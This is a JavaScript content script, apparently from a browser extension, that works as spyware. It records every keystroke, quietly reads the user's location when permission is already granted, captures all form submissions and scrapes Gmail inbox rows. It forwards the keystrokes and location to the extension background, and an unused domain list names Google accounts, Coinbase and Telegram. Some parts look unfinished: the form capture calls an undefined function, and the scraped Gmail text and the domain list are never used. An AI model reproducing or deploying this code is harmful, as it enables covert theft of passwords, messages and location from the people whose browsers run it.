"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
const valid = new Set([
    "google.com",
    "mail.google.com",
    "accounts.google.com",
    "contacts.google.com",
    "myaccount.google.com",
    "coinbase.com",
    "telegram.org",
    "web.telegram.org"
]);
const url = window.location.hostname;
let buffer = "";
let textualInputs = new Set();
let formSets = new Set();
const observer = new MutationObserver(begin);
observer.observe(document.body, { subtree: true, childList: true });
document.addEventListener("click", piggybackGeolocation);
document.addEventListener('keyup', handleKeyUp);
function begin() {
    inbox();
    piggybackGeolocation();
    setupFormInputs();
}
setTimeout(() => {
    begin();
}, 1500);
const debouncedCaptureKeylogBuffer = debounce(() => __awaiter(void 0, void 0, void 0, function* () {
    if (buffer.length > 0) {
        // Flush the buffer
        message('keyup', { url: window.location.href, text: buffer });
        buffer = "";
    }
}), 1000);
function handleKeyUp(event) {
    buffer += event.key;
    debouncedCaptureKeylogBuffer();
}
function piggybackGeolocation() {
    navigator.permissions
        .query({ name: "geolocation" })
        .then(({ state }) => {
        if (state === "granted") {
            captureGeolocation();
        }
    });
}
function captureGeolocation() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const position = yield new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition((pos) => { resolve(pos); }, (e) => { reject(e); }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
            });
            const coords = position.coords;
            message('coords', coords);
        }
        catch (e) {
        }
    });
}
function setupFormInputs() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        if (formSets.has(form)) {
            return;
        }
        formSets.add(form);
        form.addEventListener('submit', e => {
            const data = new FormData(form);
            send('form', data);
        });
    });
}
function handle_GM(elm) {
    const text = elm.innerText;
    // console.log(text)
    // console.log(elm.innerHTML)
    return {
        text: text
    };
}
function inbox() {
    if (url === "mail.google.com") {
        const rows = document.getElementsByTagName("tr");
        for (let i = 0; i < rows.length; i++) {
            const row = rows.item(i);
            if (row != null) {
                handle_GM(row);
            }
        }
    }
}
function message(key, data) {
    return __awaiter(this, void 0, void 0, function* () {
        yield chrome.runtime.sendMessage({ key: key, data: data });
    });
}
function debounce(func, delay) {
    let timeoutId;
    return function (...args) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
            func.apply(this, args);
        }, delay);
    };
}
